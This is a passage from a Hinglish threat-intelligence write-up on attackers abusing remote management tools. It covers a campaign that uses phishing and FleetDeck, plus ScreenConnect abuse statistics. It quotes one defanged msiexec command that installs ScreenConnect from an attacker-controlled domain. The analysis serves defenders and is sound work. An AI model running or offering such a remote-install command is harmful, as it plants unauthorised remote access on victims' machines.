## Attack Vector #2: RMM Abuse — Backdoor Hidden in Plain Sight

### RMM kya hota hai

Remote Monitoring and Management tools woh software hai jo MSPs use karte hain client machines ko remotely manage karne ke liye. ScreenConnect, AnyDesk, TeamViewer, GoToAssist — yeh sab legitimate tools hain legitimate uses ke saath.

Yeh perfect Command and Control infrastructure bhi hain:
- Built-in remote access aur shell execution
- Signed binaries — antivirus ko trigger nahi karte
- Corporate networks pe common hain — perfectly blend karte hain
- Operate karna easy hai — custom malware ki zaroorat nahi

**2025 mein 30.3% identifiable incidents mein RMM abuse tha.**

### "Backdoor Your Backdoor" Campaign

Yeh woh technique hai jisne mujhe genuinely impress kiya. Blackpoint ne ek campaign pattern document kiya:

**Step 1:** Phishing email aata hai — Social Security Statement, tax document, ya invoice ke disguise mein. User click karta hai, attachment run karta hai. Yeh binary **FleetDeck** install kar deti hai (ek RMM tool).

**Step 2:** FleetDeck install hone ke baad attacker ke infrastructure se connect hota hai aur silently ek remote msiexec command execute karta hai:

```
msiexec /i hxxp://server[.]bnotuyiyed[.]online/ScreenConnect.ClientSetup.msi
```

**Step 3:** Ab ScreenConnect bhi install hai. **Do footholds. Ek nahi.**

**Kyun do?** Kyunki defenders probably FleetDeck find karke remove kar denge. Lekin ScreenConnect itna common hai MSP environments mein ki duplicate install easily dismiss ho jaata hai as legitimate IT tool. Radar ke neeche reh jaata hai.

### Numbers jo real story batate hain

ScreenConnect **71.5%** rogue RMM incidents mein tha:

```
ScreenConnect  ███████████████████████████  71.5%
AnyDesk        ████                          9.6%
GoTo Resolve   ███                           8.1%
GoToAssist     ███                           7.3%
TeamViewer     ██                            4.6%
```

Aur EDR failure rate: **72% of the time, Blackpoint SOC ne detect aur respond kar liya traditional EDR agents ke alert karne se pehle.**

Agar tumhara poora security plan EDR pe based hai — tum yeh 72% of the time miss kar rahe ho.

